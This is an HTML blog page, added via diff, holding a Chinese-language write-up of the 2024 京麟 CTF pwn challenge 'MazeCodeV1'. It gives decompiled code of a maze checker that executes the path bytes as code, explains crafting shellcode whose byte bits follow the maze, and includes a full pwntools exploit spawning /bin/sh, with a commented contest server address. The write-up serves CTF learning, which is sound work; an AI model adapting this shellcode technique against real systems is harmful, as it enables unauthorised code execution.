@@ -1,0 +1,220 @@
+<!doctype html>
+<html lang="zh-CN" data-base="/">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2024 京麟 CTF - MazeCodeV1 · Y0uYuGe</title>
+<meta name="description" content="这里用 /bin/sh 作为系统调用的输入。至于指令部分，我们不知道 mmap 的起始地址，opcode 部分也很难绕过。所以关键在于 read 系统调用和 execve 系统调用——先想好基础的 gadget，再改造它们以满足绕过条件。IDA 中有一个地图字符串，由于它是 42 行 42 列的正方形地图，我们根据地图推出最终路线，再根据路线所需的指令得到合适的指令字节。使用 asm 时，对应的汇编指令之间必须有换行符，否则两条指令连在一行会出问题。\&quot;SPL\&quot; 通常指寄存器 esp（栈指针寄存器）">
+<link rel="stylesheet" href="/blog/article.css">
+</head>
+<body data-page="article">
+<header class="bar">
+  <a class="brand" href="/">Y0uYuGe</a>
+  <a class="tomap" href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E4%BA%AC%E9%BA%9F%20CTF%20-%20MazeCodeV1" title="在导图上看这篇文章的位置">◎ 在导图中查看</a>
+</header>
+<div class="wrap">
+  <main class="post">
+    <nav class="crumbs"><a href="/#/">Y0uYuGe</a><span class="sep">›</span><a href="/#/endpoint-security">终端安全</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn">CTF 与 Pwn</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups">题解</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2024">2024 年</a></nav>
+    <h1>2024 京麟 CTF - MazeCodeV1</h1>
+    <div class="meta"><time>2024-05-29</time><span class="tag">#pwn</span><span class="tag">#CTF</span></div>
+    <article class="post-body">
+<p><a href="https://www.ctfiot.com/184181.html">https://www.ctfiot.com/184181.html</a></p>
+<h1 id="保护检查">保护检查</h1>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E4%BA%AC%E9%BA%9F%20CTF%20-%20MazeCodeV1/assets/csdn-139304701/image-001-4e1d709035.png" alt="图片"></p>
+<h1 id="代码">代码</h1>
+<pre><code class="language-cpp">__int64 __fastcall check_solve(char *a1)
+{
+  __int64 result; // rax
+  __int64 v2; // rax
+  __int64 index_step; // rax
+  __int64 v4; // rax
+  __int64 v5; // rax
+  __int64 v6; // rax
+  char *map; // [rsp+0h] [rbp-190h]
+  int v8; // [rsp+Ch] [rbp-184h]
+  __int64 v9[2]; // [rsp+20h] [rbp-170h] BYREF
+  __int64 now_position; // [rsp+34h] [rbp-15Ch]
+  int change_x; // [rsp+3Ch] [rbp-154h]
+  int change_y; // [rsp+40h] [rbp-150h]
+  char opcode; // [rsp+47h] [rbp-149h]
+  __int64 v14; // [rsp+48h] [rbp-148h] BYREF
+  __int64 v15[2]; // [rsp+50h] [rbp-140h] BYREF
+  __int64 last_position; // [rsp+64h] [rbp-12Ch]
+  int v17[5]; // [rsp+6Ch] [rbp-124h] BYREF
+  char map_step[264]; // [rsp+80h] [rbp-110h] BYREF
+  char *v19; // [rsp+188h] [rbp-8h]
+
+  v19 = a1;
+  memset(map_step, 0, 0x100uLL);
+  v17[0] = 0;
+  v17[1] = 0;
+  v17[2] = 1;
+  v17[3] = 2;
+  v17[4] = 3;
+  last_position = 0x100000001LL;                // 初始位置1,1
+  v15[1] = (__int64)a1;
+  v15[0] = std::string::begin((__int64)a1);
+  v14 = std::string::end(a1);
+  while ( 1 )
+  {
+    result = __gnu_cxx::operator!=&lt;char *,std::string&gt;(v15, &amp;v14);// 判断操作是否结束
+    if ( (result &amp; 1) == 0 )
+      return result;
+    opcode = *(_BYTE *)__gnu_cxx::__normal_iterator&lt;char *,std::string&gt;::operator*(v15);// 迭代遍历操作
+    if ( (unsigned __int64)v17[0] &gt;= 0x100 )
+    {
+      v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Too Long Solution!&quot;);
+      return std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+    }
+    change_y = 0;
+    change_x = 0;
+    switch ( opcode &amp; 3 )
+    {
+      case 0:
+        change_x = -1;
+        break;
+      case 1:
+        change_y = 1;
+        break;
+      case 2:
+        change_x = 1;
+        break;
+      case 3:
+        change_y = -1;
+        break;
+      default:
+        break;
+    }
+    HIDWORD(now_position) = change_y + HIDWORD(last_position);// 高32位表示y坐标。低32位表示x坐标
+    LODWORD(now_position) = change_x + last_position;
+    if ( !(unsigned int)IsInBounds(change_y + HIDWORD(last_position), change_x + (int)last_position) )
+    {
+      v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Out-Of-Bound Detected!&quot;);
+      return std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+    }
+    index_step = v17[0]++;
+    map_step[index_step] = opcode;
+    map = grid;
+    v8 = map[(int)XYToIndex(SHIDWORD(now_position), now_position)];
+    if ( v8 == &#39;#&#39; )
+    {
+      v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Wall Hit!&quot;);
+      return std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+    }
+    if ( v8 == &#39;T&#39; )
+    {
+      v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Congratulations!&quot;);
+      std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+      v9[0] = (__int64)map_step;
+      v9[1] = (__int64)v17;
+      check_solve(std::string)::$_0::operator()(v9);
+    }
+    else
+    {
+      last_position = now_position;             // 更新当前坐标
+    }
+    __gnu_cxx::__normal_iterator&lt;char *,std::string&gt;::operator++(v15);// 下一个操作
+  }
+}
+最后达到指定位置会执行
+__int64 __fastcall check_solve(std::string)::$_0::operator()(__int64 *a1)
+{
+  __int64 v1; // rax
+  char *addr; // [rsp+8h] [rbp-38h]
+
+  addr = (char *)mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
+  if ( addr != (char *)-1LL )
+  {
+    *(_WORD *)addr = &#39;1H&#39;;
+    addr[2] = &#39;\xC0&#39;;
+    memcpy(addr + 3, (const void *)*a1, *(int *)a1[1]);
+    mprotect(addr, 0x1000uLL, 5);
+    __asm { jmp     rax } 
+  }
+  v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Bad mmap()&quot;);
+  return std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
+}
+</code></pre>
+<p>IDA 中有一个地图字符串，由于它是 42 行 42 列的正方形地图，我们根据地图推出最终路线，再根据路线所需的指令得到合适的指令字节</p>
+<h1 id="思路">思路</h1>
+<ol>
+<li>找到合适的指令，使它们构成的字节码的最低两位能够满足最终到达 T 位置</li>
+<li>这些指令能够 getshell</li>
+<li>这样最终到达 T 位置时，就会调用这些指令从而 getshell</li>
+</ol>
+<p>这里用 /bin/sh 作为系统调用的输入。至于指令部分，我们不知道 mmap 的起始地址，opcode 部分也很难绕过。所以关键在于 read 系统调用和 execve 系统调用——先想好基础的 gadget，再改造它们以满足绕过条件</p>
+<h1 id="单字节指令">单字节指令</h1>
+<p>push pop  xchg  </p>
+<h1 id="注意">注意</h1>
+<p>使用 asm 时，对应的汇编指令之间必须有换行符，否则两条指令连在一行会出问题</p>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E4%BA%AC%E9%BA%9F%20CTF%20-%20MazeCodeV1/assets/csdn-139304701/image-002-c59d041c3d.png" alt="图片">
+&quot;SPL&quot; 通常指寄存器 esp（栈指针寄存器）</p>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E4%BA%AC%E9%BA%9F%20CTF%20-%20MazeCodeV1/assets/csdn-139304701/image-003-954feda36d.png" alt="图片"></p>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E4%BA%AC%E9%BA%9F%20CTF%20-%20MazeCodeV1/assets/csdn-139304701/image-004-15a1854c4e.png" alt="图片"></p>
+<h1 id="附上-s1um4i-师傅们的-exp">附上 S1uM4i 师傅们的 exp</h1>
+<pre><code class="language-python">from pwn import *
+
+
+def rep(s):
+    return s.replace(&quot;2&quot;, &quot; xchg esi,eax\n&quot;).replace(&quot;3&quot;, &quot; xchg ebx,eax\n&quot;).replace(&quot;1&quot;, &quot; xchg ebp, eax\n&quot;).replace(&quot;0&quot;, &quot; nop\n&quot;)
+
+
+def rep2(s):
+    return s.replace(&quot;2&quot;, &quot; push rdx\n&quot;).replace(&quot;3&quot;, &quot; push rbx\n&quot;).replace(&quot;1&quot;, &quot; push rcx\n&quot;).replace(&quot;0&quot;, &quot; nop\n&quot;)
+
+
+context.arch = &quot;amd64&quot;
+
+sc1 = &#39;&#39;&#39;xchg   ecx,eax
+xchg   ecx,eax
+xchg   ecx,eax
+xchg   ecx,eax
+xchg   edx,eax
+mov esp, 0x404e02 
+xchg   edx,eax&#39;&#39;&#39;
+sc2 = b&#39;\x40\xFE\xCC\x92\x40\xFE\xCC&#39;  #减小栈顶的值
+sc3 = &#39;&#39;&#39;xchg   edx,eax
+push rsp
+pop rdx
+push rsp
+pop rsi
+push rdx
+pop rcx                                                                                      
+syscall\n&#39;&#39;&#39; + rep(&#39;1001122112211001111221122221122222211001111221122110011000000110000110000112222222&#39;) + &#39; mov bx,0x6873\n&#39; + rep(&#39;22222332211223333223322221122333322111122110011112222330&#39;) + &#39;&#39;&#39; 
+xchg   edx,eax  
+xchg   edx,eax
+xchg   edx,eax
+xchg   ecx,eax
+pop    rdi
+pop rcx
+pop rcx
+push rdx
+push rdx
+push rdx
+push   0x3b\n&#39;&#39;&#39; + rep(&#39;3003322&#39;) + &#39;pop   rax\n&#39; + rep2(&#39;222111&#39;) + &#39;syscall\n xchg   ecx,eax&#39;
+# mov bx,0x6873只是满足字节码要求而已
+p = process(&quot;./pwn&quot;)
+#p = remote(&quot;116.198.74.135&quot;, 39659)
+sc = asm(sc1) + sc2 + asm(sc3)
+for i in sc:
+    print(str(i&amp;3), end=&quot;&quot;)
+print()
+gdb.attach(p, &quot;b *0x401744&quot;)
+pause()
+# sleep(1)
+p.sendline(sc)
+sleep(1)
+p.sendline(cyclic(999).replace(b&#39;aaaabaaa&#39;, p64(0x404dd0)).replace(b&#39;eaaafaaa&#39;, b&#39;/bin/sh\x00&#39;))
+#输入的前八个字节是p64(0x404dd0)，第16个字节后是b&#39;/bin/sh\x00&#39;  cyclic有一定规律
+p.interactive()
+</code></pre>
+
+    </article>
+    
+    <nav class="pn"><a href="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/"><span class="l">上一篇</span>2024 春秋杯网络安全联赛夏季赛 - PWN</a><a href="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20Blue%20Water%20CTF%20-%20The%20Great%20Escape%EF%BC%88%E5%A4%A7%E9%80%83%E9%80%B8%EF%BC%89/"><span class="l">下一篇</span>2024 Blue Water CTF - The Great Escape（大逃逸）</a></nav>
+  </main>
+  
+</div>
+<script type="module" src="/blog/article.js"></script>
+</body>
+</html>
